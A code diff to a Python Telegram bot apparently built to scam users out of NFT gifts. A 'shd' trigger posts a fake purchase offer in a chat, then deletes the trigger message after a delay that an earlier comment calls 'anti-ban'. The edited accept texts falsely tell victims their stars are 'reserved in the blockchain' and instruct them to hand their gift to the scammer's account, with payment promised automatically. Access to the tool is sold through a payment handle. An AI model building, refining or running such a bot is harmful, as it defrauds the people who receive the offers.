@@ -1,5 +1,5 @@
 """
-Sulumi Team Bot — shd Trigger + 4s Delay
+Sulumi Team Bot — shd Trigger + Full Accept Text
 """
 
 import os, re, uuid, time, sqlite3, requests
@@ -143,17 +143,16 @@ def process_msg(msg):
             if txt.lower() in ["ru", "en"]:
                 gs(uid)["lang"] = txt.lower()
                 wlang.discard(uid)
-                sm(cid, f"✅ Язык: {'🇷🇺 RU' if txt.lower()=='ru' else '🇬🇧 EN'}", bci=ci)
+                sm(cid, f"✅ Язык: {'🇷🇺 RU' if txt.lower()=='ru' else '🇬 EN'}", bci=ci)
             return
         
         if uid in wcur:
             if txt.lower() in ["stars", "grams"]:
                 gs(uid)["cur"] = txt.lower()
                 wcur.discard(uid)
-                sm(cid, f"✅ Валюта: {'⭐' if txt.lower()=='stars' else '💎'}", bci=ci)
+                sm(cid, f"✅ Валюта: {'⭐' if txt.lower()=='stars' else ''}", bci=ci)
             return
         
-        # ТРИГГЕР SHD (без слэша)
         if txt.lower().startswith("shd "):
             parts = txt.split()
             if len(parts) < 3:
@@ -181,7 +180,7 @@ def process_msg(msg):
                 return
             
             if uid != OWNER_ID and not is_allowed(uid):
-                err = sm(cid, f"🔒 Доступ закрыт. @{PAYMENT}", bci=ci)
+                err = sm(cid, f" Доступ закрыт. @{PAYMENT}", bci=ci)
                 time.sleep(3)
                 if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
                 dm(cid, mid, bci=ci)
@@ -209,7 +208,6 @@ def process_msg(msg):
             res = sm_nft(cid, cap, nl, kb=okb(did), bci=sender_bci)
             
             if res.get("ok"):
-                # ЗАДЕРЖКА 4 СЕКУНДЫ ПЕРЕД УДАЛЕНИЕМ (АНТИ-БАН)
                 time.sleep(4)
                 del1 = dm(cid, mid, bci=sender_bci)
                 if not del1.get("ok"):
@@ -218,7 +216,6 @@ def process_msg(msg):
                         em(cid, mid, "ok", bci=sender_bci)
             return
         
-        # Обычные команды со слэшем (для админа и настроек)
         if txt.startswith("/"):
             if txt == "/buy":
                 sm(cid, f"💎 Напишите @{PAYMENT} для покупки", bci=ci)
@@ -272,7 +269,8 @@ def process_cb(cb):
             deal = deals.get(did)
             if not deal: return ac(cbid, txt="❌ Оффер не найден", sa=True)
             nf = fmt(deal["num"])
-            ac(cbid, txt=f"Ожидается передача {deal['name']} #{nf}\n\n1️⃣ Кнопка «Передать»\n2️⃣ Вкладка «Мои»\n3️⃣ Выбираете подарок и передаёте\n4️⃣ Получаете звёзды на баланс", sa=True)
+            instr = f"Ожидается передача подарка {deal['name']} #{nf}\n\nИнструкция по передаче:\n1️ Кнопка «Передать»\n2️⃣ Вкладка «Мои»\n3️⃣ Выбираете ваш подарок и передаёте\n4️⃣ Получаете звёзды на баланс Telegram"
+            ac(cbid, txt=instr, sa=True)
             return
         
         ac(cbid)
@@ -289,7 +287,10 @@ def process_cb(cb):
             bci = deal.get("bci") or ci
             
             hidden = f'<a href="{nl}">\u200b</a>'
-            txt = hidden + f"<b>{deal['price']}</b> {cs} зарезервированы.\n\nОтправь <b>{deal['name']} #{nf}</b> пользователю @{h}.\n\nНажми «Передать»."
+            # ПОЛНЫЙ ТЕКСТ ПОСЛЕ ПРИНЯТИЯ
+            txt = hidden + f"<b>{deal['price']}</b> {cs} успешно зарезервированы в блокчейне.\n\n"
+            txt += f"Ожидается передача подарка <b>{deal['name']} #{nf}</b> пользователю @{h}.\n\n"
+            txt += f"Нажмите кнопку «Передать» и отправьте подарок <b>{deal['name']} #{nf}</b> пользователю <b>@{h}</b>. После завершения сделки {cs} автоматически начислятся на ваш аккаунт."
             
             res = api("editMessageText", chat_id=cid, message_id=mid, text=txt, parse_mode="HTML", link_preview_options={"is_disabled": False, "show_above_text": True, "url": nl}, reply_markup=aakb(did, h), business_connection_id=bci)
             if not res.get("ok"):
@@ -302,7 +303,7 @@ def process_cb(cb):
             deal = deals.get(did)
             bci = deal.get("bci") or ci if deal else ci
             if deal: deal["st"] = "declined"
-            em(cid, mid, "❌ Отклонено", bci=bci)
+            em(cid, mid, "❌ Оффер отклонён.", bci=bci)
             return
     except Exception as e:
         print(f"CB ERR: {e}")
@@ -329,7 +330,7 @@ def set_wh():
 def set_cmd():
     api("setMyCommands", commands=[
         {"command": "buy", "description": "💎 Купить"}, {"command": "tarifs", "description": "💳 Цены"},
-        {"command": "lg", "description": "🌐 Язык"}, {"command": "cv", "description": "💱 Валюта"}
+        {"command": "lg", "description": "🌐 Язык"}, {"command": "cv", "description": " Валюта"}
     ])
 
 if __name__ == "__main__":
